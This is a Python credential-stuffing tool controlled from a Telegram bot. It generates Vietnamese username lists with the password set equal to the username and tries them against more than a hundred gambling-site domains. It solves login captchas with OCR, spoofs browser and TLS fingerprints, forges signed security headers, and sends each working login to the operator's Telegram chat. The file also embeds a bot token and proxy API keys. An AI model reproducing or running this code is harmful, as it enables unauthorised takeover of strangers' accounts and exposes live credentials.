import os
os.environ["OMP_NUM_THREADS"] = "1"
os.environ["MKL_NUM_THREADS"] = "1"
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["VECLIB_MAXIMUM_THREADS"] = "1"
os.environ["NUMEXPR_NUM_THREADS"] = "1"
import sys
import time
import uuid
import base64
import random
import hashlib
import secrets
import threading
import json
import re
import io
from queue import Queue, Empty
from typing import Optional, Dict, Any, List, Tuple
import requests

# ── Dependencies ──────────────────────────────────────────
try:
    from curl_cffi import requests as cffi_requests
    import ddddocr
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    from PIL import Image, ImageOps, ImageEnhance
    import numpy as np
    from aiogram import Bot, Dispatcher, types
    from aiogram.filters import Command
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
except ImportError as e:
    print(f"❌ Thiếu thư viện: {e}.")
    sys.exit(1)

# ============ CONFIG & DOMAINS FILE ============
DOMAINS_FILE = "domains.json"

DEFAULT_DOMAINS = [
    "m.111pg99.com",
    "m.164789.com",
    "m.16vvvwin.com",
    "m.18win.com",
    "m.190789.com",
    "m.1bmw.com",
    "m.1bmw.me",
    "m.1bmw.tv",
    "m.1pg66.com",
    "m.2026pg66.com",
    "m.202789.com",
    "m.23win.baby",
    "m.23win08.com",
    "m.23win09.com",
    "m.26hello88.com",
    "m.2888.com",
    "m.2pg66.com",
    "m.32win75.com",
    "m.32win76.com",
    "m.32win77.com",
    "m.333pg99.com",
    "m.336049.com",
    "m.43nmvd.com",
    "m.4vipwin.com",
    "m.5ivug.fun",
    "m.5vipwin.com",
    "m.69vn5.com",
    "m.69vn6.com",
    "m.69vn7.com",
    "m.69vn8.com",
    "m.789bettg.net",
    "m.789win0052.com",
    "m.79k09.club",
    "m.79king1.com",
    "m.82king88.com",
    "m.88ck.xyz",
    "m.88ok7.net",
    "m.88vv.my",
    "m.89bet3000.com",
    "m.8k0341q.top",
    "m.8k4028q.top",
    "m.8k438sj.top",
    "m.98wn65.com",
    "m.abc11.ink",
    "m.abc81.store",
    "m.by6yg1.com",
    "m.dpyg3.xyz",
    "m.f8897.vip",
    "m.f8beaa.top",
    "m.f8bet6.chat",
    "m.ffok04.com",
    "m.ffok05.com",
    "m.ffok06.com",
    "m.ffok07.com",
    "m.gjjdhh-235dhdhkk.vip",
    "m.good8812.cc",
    "m.good8813.cc",
    "m.good8814.cc",
    "m.good8815.cc",
    "m.hello66.com",
    "m.hi88208.com",
    "m.hi88278.com",
    "m.hi88298.com",
    "m.hi88xx.com",
    "m.hkt699e.vip",
    "m.hubet59.com",
    "m.j866.ink",
    "m.kardupo.cc",
    "m.kl99.fan",
    "m.kl991.com",
    "m.kuwn42.com",
    "m.kuwn57.com",
    "m.kuwn58.com",
    "m.lomzeti.cc",
    "m.mb6614.run",
    "m.mb66a3.com",
    "m.mmrkb1.com",
    "m.new888e.vip",
    "m.new88pc.com",
    "m.newwa.vip",
    "m.nh113.vip",
    "m.nh114.vip",
    "m.nh225.vip",
    "m.ok36533.vip",
    "m.ok36555.vip",
    "m.ok36556.vip",
    "m.ok36557.vip",
    "m.ok559.cc",
    "m.okking72.com",
    "m.okking91.com",
    "m.okvnd.my",
    "m.pg99066.icu",
    "m.pg99go.com",
    "m.shbe60.net",
    "m.u821.store",
    "m.u888w.click",
    "m.vip32win.club",
    "m.vipwin18.com",
    "m.vipwin19.com",
    "m.vipwin20.com",
    "m.vvvwin04.vip",
    "m.vvvwin05.vip",
    "m.win55mm.com",
    "m.win55mmm.com",
    "m.xin88.xin"
]

domain_lock = threading.Lock()
cache_lock = threading.Lock()

def load_domains() -> List[str]:
    with domain_lock:
        if os.path.exists(DOMAINS_FILE):
            try:
                with open(DOMAINS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, list) and data:
                        return data
            except Exception:
                pass
    save_domains(DEFAULT_DOMAINS)
    return DEFAULT_DOMAINS

def save_domains(domains: List[str]):
    with domain_lock:
        try:
            with open(DOMAINS_FILE, "w", encoding="utf-8") as f:
                json.dump(domains, f, ensure_ascii=False, indent=4)
        except Exception:
            pass

selected_scan_domains = []

NEST_API_KEY = "63ed0cc2-6d3d-4638-ae19-e1055a00f4e9"
NEST_PROXY_KEY = "UK-b3014e75-d8a1-43d1-88de-36347bd5d954"

# TỐI ƯU 1: GIẢM SỐ LUỒNG TỪ 50 XUỐNG 10 ĐỂ KHÔNG BỊ TRÀN RAM RAILWAY
NUM_THREADS = 10 
PROGRESS_EVERY = 100

DEFAULT_TG_TOKEN = '8945935067:AAE2VDijVUdIM-DYUlmKff2uvWgZBdpgjjI'
DEFAULT_TG_CHAT_ID = '7348217229'

is_scanning = False

HO_DEM_KHONG_DAU = [
    "nguyen", "tran", "le", "pham", "hoang", "huynh", "phan", "vu", "vinh", "vo",
    "dang", "bui", "do", "ho", "ngo", "duong", "ly", "an", "bao", "binh",
    "chinh", "cong", "cuong", "dung", "duy", "dai", "dat", "duc", "duong", "giang",
    "hai", "hao", "hieu", "hoa", "hoang", "huy", "hung", "huong", "kha", "khanh",
    "khoa", "kiet", "lam", "linh", "long", "luong", "minh", "nam", "nghia", "nhan",
    "nhat", "phat", "phong", "phuc", "phuong", "quan", "quang", "quynh", "sang", "son",
    "tai", "tam", "tan", "thanh", "thao", "thien", "thinh", "thu", "thuan", "thuong",
    "tien", "toan", "trang", "tri", "triet", "trung", "truong", "tuan", "tung", "uyen",
    "van", "viet", "vinh", "vu", "vy", "bien", "cam", "chau", "chi", "diep", "duyen",
    "hien", "hong", "hue", "lan", "mai", "my", "nga", "ngoc", "nhung"
]

HO_VA_TEN = [
    "anh", "bao", "binh", "chinh", "cong", "cuong", "dung", "duy", "dai", "dat",
    "duc", "dung", "duong", "giang", "hai", "hao", "hieu", "hoa", "hoang", "huy",
    "hung", "huong", "kha", "khanh", "khoa", "kiet", "lam", "linh", "long", "luong",
    "minh", "nam", "nghia", "nhan", "nhat", "phat", "phong", "phuc", "phuong", "quan",
    "quang", "quynh", "sang", "son", "tai", "tam", "tan", "thanh", "thao", "thien",
    "thinh", "thu", "thuan", "thuong", "tien", "toan", "trang", "tri", "triet", "trung",
    "truong", "tuan", "tung", "uyen", "van", "viet", "vinh", "vu", "vinh", "vy",
    "an", "bien", "cam", "chau", "chi", "diep", "dung", "duyen", "giang", "hien",
    "hoa", "hong", "hue", "huong", "khanh", "lan", "linh", "mai", "my", "nga",
    "ngoc", "nhung", "phuong", "quynh", "tam", "thao", "thu", "thuy", "trang", "uyen"
]

class FormStates(StatesGroup):
    waiting_for_range = State()
    waiting_for_confirmation = State()
    waiting_for_new_domain = State()

def generate_txt_file(num_unique_names: int, start_num: int, end_num: int, single_name_mode: bool, selected_names: List[str] = None) -> List[str]:
    lines = []
    try:
        if single_name_mode:
            base_name = selected_names[0] if selected_names else f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}"
            for i in range(start_num, end_num + 1):
                lines.append(f"{base_name}{i}")
        else:
            names_pool = selected_names if selected_names else [f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}" for _ in range(num_unique_names)]
            for name in names_pool:
                for i in range(start_num, end_num + 1):
                    lines.append(f"{name}{i}")

        with open("100.txt", "w", encoding="utf-8") as f:
            for line in lines:
                f.write(f"{line}\n")
        return lines
    except Exception as e:
        print(f"Lỗi tạo file: {e}")
        return []

# TỐI ƯU 2: CHỈ KHỞI TẠO 1 OCR INSTANCE DUY NHẤT ĐỂ TIẾT KIỆM RAM (THAY CHO 128 INSTANCES)
global_ocr = ddddocr.DdddOcr(show_ad=False)
ocr_lock = threading.Lock()

def load_accounts() -> list:
    users = []
    if not os.path.exists("100.txt"):
        generate_txt_file(num_unique_names=5, start_num=1, end_num=200, single_name_mode=False)
    try:
        with open("100.txt", "r", encoding="utf-8", errors="ignore") as f:
            seen = set()
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|") if "|" in line else line.split(":")
                u = parts[0].strip() if len(parts) >= 2 else line.strip()
                if u and u not in seen:
                    seen.add(u)
                    users.append({"user": u, "pw": u})
    except Exception as e:
        print(f"⚠️ Lỗi đọc file tài khoản: {e}")
    return users

print_lock = threading.Lock()
class Col:
    GREEN = "\033[92m"; RED = "\033[91m"; CYAN = "\033[96m"; GOLD = "\033[33;1m"; RESET = "\033[0m"

def log_safe(msg, color=Col.RESET):
    with print_lock:
        print(f"{color}{msg}{Col.RESET}")

def send_telegram(site: str, user: str, balance: str, vip: str, lixi: str, is_big_win: bool, is_high_vip: bool):
    text = f"✨ <b>SAO PHAI XOAN</b> ✨\n🪐 <b>Web:</b> <code>https://{site}</code>\n👤 <b>User:</b> <code>{user}</code>\n💰 <b>Bal:</b> <code>{balance}</code> | 🎖️ <b>VIP:</b> <code>{vip}</code>"
    url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
    payload = {"chat_id": DEFAULT_TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(url_send, json=payload, timeout=10)
    except Exception:
        pass

class AntiDetect:
    @classmethod
    def generate(cls) -> Dict[str, Any]:
        ua = "Mozilla/5.0 (Linux; Android 14; SM-S931B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36"
        return {
            "ua": ua, 
            "sec_ch_ua": '"Not/A)Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
            "device_fp": hashlib.md5(secrets.token_hex(16).encode()).hexdigest(),
            "tls_profile": "chrome120"
        }

PUB_KEY = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCKcWX+rK229Li2zXDtB5KJOESv
RrCTNiUIwZ/Iljkfm9lSnt22N8Iqzv/h8O1+xTMqlORSJM1Xq3tRtRIUNMJMTEv8
oqUOJesJFPE+V0agCQ5COhKrUkTqjJ71izDUGJokeCIL4zSV1y7ZJI1PKcP+BH5o
NM6BVGhApPFQeDrI/QIDAQAB
-----END PUBLIC KEY-----"""

def make_sec_headers(domain: str, ua: str) -> Dict[str, str]:
    ts = str(int(time.time() * 1000))
    nonce = str(uuid.uuid4())
    data = f"{ts}:{nonce}:{domain}:{ua}".encode("utf-8")
    key = RSA.import_key(PUB_KEY)
    ciph = PKCS1_v1_5.new(key)
    enc = b"".join(ciph.encrypt(data[i:i+117]) for i in range(0, len(data), 117))
    return {"x-nonce": nonce, "x-timestamp": ts, "x-sec-data": base64.b64encode(enc).decode()}

# TỐI ƯU 3: DÙNG PILLOW XỬ LÝ ẢNH THAY VÌ OPENCV ĐỂ TIẾT KIỆM RAM
def solve_captcha(img_b64: str) -> Optional[str]:
    try:
        if "," in img_b64: img_b64 = img_b64.split(",")[1]
        img_bytes = base64.b64decode(img_b64)
        
        image = Image.open(io.BytesIO(img_bytes)).convert("L")
        image = ImageOps.autocontrast(image)
        
        buf = io.BytesIO()
        image.save(buf, format="PNG")
        proc_bytes = buf.getvalue()

        with ocr_lock:
            res = global_ocr.classification(proc_bytes, png_fix=True)
            if not res: res = global_ocr.classification(img_bytes)

        if not res: return None
        res = res.strip().upper().replace(" ", "").replace("O", "0").replace("L", "1").replace("I", "1")
        cleaned_res = re.sub(r'[^A-Z0-9]', '', res)
        return cleaned_res if 3 <= len(cleaned_res) <= 6 else None
    except Exception:
        return None

class SiteAPI:
    def __init__(self, domain: str, proxy: Optional[str] = None):
        self.domain = domain
        self.profile = AntiDetect.generate()
        self.ua = self.profile["ua"]
        self.fp = self.profile["device_fp"]
        self.auth_token = None
        self.session = cffi_requests.Session(impersonate=self.profile["tls_profile"])
        if proxy:
            p = proxy if "://" in proxy else f"http://{proxy}"
            self.session.proxies = {"http": p, "https": p}
        self.session.headers.update({
            "user-agent": self.ua, 
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*", 
            "referer": f"https://{domain}/", 
            "origin": f"https://{domain}"
        })
        self.login_endpoint = "/portalApi/1.0/login/submit"
        self.captcha_endpoint = "/portalApi/1.0/login/captcha"

    def _sec(self) -> Dict[str, str]:
        headers = make_sec_headers(self.domain, self.ua)
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        return headers

    def get_captcha_login(self) -> Optional[Dict[str, Any]]:
        try:
            r = self.session.get(f"https://{self.domain}{self.captcha_endpoint}", timeout=6.0)
            if r.status_code == 200:
                res = r.json()
                result_obj = res.get("Result") or res.get("Data") or res.get("ReturnObject") or res
                if isinstance(result_obj, dict):
                    img = result_obj.get("Image") or result_obj.get("image") or result_obj.get("img")
                    val = result_obj.get("EncryptValue") or result_obj.get("Value") or result_obj.get("value")
                    if img: return {"image": img, "value": val or "", "no_captcha": False}
        except Exception:
            pass
        return {"image": None, "value": "", "no_captcha": True}

    def login(self, user: str, pw: str, code: str = "", enc_val: str = "") -> str:
        body = {"account": user, "password": pw, "checkCode": code, "checkCodeEncrypt": enc_val, "fingerprint": self.fp}
        try:
            r = self.session.post(f"https://{self.domain}{self.login_endpoint}", json=body, headers=self._sec(), timeout=10)
            if r.status_code == 200:
                res = r.json()
                if res.get("Code") in [200, 0] or res.get("IsSuccess") is True:
                    return "SUCCESS"
                return "WRONG_PASS"
        except Exception:
            pass
        return "FAIL"

def run_scanner_task(chat_id: int):
    global is_scanning
    is_scanning = True
    accounts = load_accounts()
    domains_to_scan = selected_scan_domains if selected_scan_domains else load_domains()
    
    task_queue = Queue()
    for a in accounts:
        for domain in domains_to_scan:
            task_queue.put((a, domain))

    def worker():
        while is_scanning:
            try:
                acc, domain = task_queue.get(timeout=1)
            except Empty:
                break
            try:
                api = SiteAPI(domain)
                cap_data = api.get_captcha_login()
                code = solve_captcha(cap_data.get('image', '')) if cap_data and cap_data.get('image') else ""
                res = api.login(acc['user'], acc['pw'], code, cap_data.get('value', '') if cap_data else '')
                if res == "SUCCESS":
                    log_safe(f"[SUCCESS] {domain} | {acc['user']}", Col.GREEN)
                    send_telegram(domain, acc['user'], "0", "0", "", False, False)
            except Exception:
                pass
            task_queue.task_done()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(NUM_THREADS)]
    for t in threads: t.start()
    for t in threads: t.join()

    is_scanning = False
    log_safe("✅ Đã quét xong!", Col.GREEN)

# ============ TELEGRAM BOT HANDLERS ============
telegram_bot = Bot(token=DEFAULT_TG_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="🚀 Bắt đầu quét", callback_data="start_scan")
    builder.button(text="⏹ Dừng lại", callback_data="stop_scan")
    builder.adjust(1)
    await message.answer("🤖 **BẢNG ĐIỀU KHIỂN BOT**", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "start_scan")
async def cb_start_scan(callback: types.CallbackQuery):
    await callback.answer()
    threading.Thread(target=run_scanner_task, args=(callback.message.chat.id,), daemon=True).start()
    await callback.message.answer("🚀 **Đã bắt đầu quét trên Railway!**")

@dp.callback_query(lambda c: c.data == "stop_scan")
async def cb_stop_scan(callback: types.CallbackQuery):
    await callback.answer()
    global is_scanning
    is_scanning = False
    await callback.message.answer("⏹ **Đã gửi lệnh dừng!**")

async def main():
    log_safe("🤖 Telegram Bot đã sẵn sàng...", Col.GOLD)
    await dp.start_polling(telegram_bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
